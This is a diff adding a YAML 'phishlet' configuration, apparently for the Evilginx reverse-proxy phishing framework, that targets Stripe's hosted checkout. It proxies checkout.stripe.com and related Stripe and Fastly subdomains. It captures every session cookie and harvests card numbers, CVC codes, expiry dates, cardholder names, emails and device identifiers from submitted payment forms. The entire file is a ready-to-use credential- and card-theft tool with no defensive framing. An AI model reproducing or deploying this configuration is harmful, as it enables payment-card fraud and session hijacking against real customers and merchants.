@@ -1,0 +1,76 @@
+author: 'IMPERATOR'
+min_ver: '2.4.0'
+proxy_hosts:
+  - {phish_sub: 'checkout', orig_sub: 'checkout', domain: 'stripe.com', session: true, auto_filter: true, is_landing: true}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'stripe.com', session: false, auto_filter: true, is_landing:false}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'stripe.network', session: false, auto_filter: true, is_landing:false}
+  - {phish_sub: 'js', orig_sub: 'js', domain: 'stripe.com', session: false, auto_filter: true, is_landing:false}
+  - {phish_sub: 'q', orig_sub: 'q', domain: 'stripe.com', session: false, auto_filter: true, is_landing:false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'stripe.com', session: false, auto_filter: true, is_landing:false}
+  - {phish_sub: 'r', orig_sub: 'r', domain: 'stripe.com', session: false, auto_filter: true, is_landing:false}
+  - {phish_sub: 'stripe-camo.global.ssl', orig_sub: 'stripe-camo.global.ssl', domain: 'fastly.net', session: false, auto_filter: true, is_landing:false}
+
+sub_filters:
+  - {triggers_on: 'checkout.stripe.com', orig_sub: 'checkout', domain: 'stripe.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'checkout.stripe.com', orig_sub: 'checkout', domain: 'stripe.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+
+auth_tokens:
+  - domain: '.stripe.com'
+    keys: ['.*,regexp'] 
+  - domain: 'm.stripe.com'
+    keys: ['.*,regexp']       
+  - domain: 'stripe.com'
+    keys: ['.*,regexp'] 
+
+credentials:
+  username:
+    key: 'card[number]'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'card[cvc]'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'type'
+      search: '(.*)'
+      type: 'post'
+    - key: 'card[number]'
+      search: '(.*)'
+      type: 'post'
+    - key: 'card[cvc]'
+      search: '(.*)'
+      type: 'post'
+    - key: 'card[exp_month]'
+      search: '(.*)'
+      type: 'post'
+    - key: 'card[exp_year]'
+      search: '(.*)'
+      type: 'post'
+    - key: 'billing_details[name]'
+      search: '(.*)'
+      type: 'post'
+    - key: 'billing_details[email]'
+      search: '(.*)'
+      type: 'post'
+    - key: 'guid'
+      search: '(.*)'
+      type: 'post'
+    - key: 'muid'
+      search: '(.*)'
+      type: 'post'
+    - key: 'sid'
+      search: '(.*)'
+      type: 'post'
+    - key: 'payment_user_agent'
+      search: '(.*)'
+      type: 'post'
+
+     
+auth_urls:
+  - '/'
+  - '/c'
+  
+login:
+  domain: 'checkout.stripe.com'
+  path: '/' 
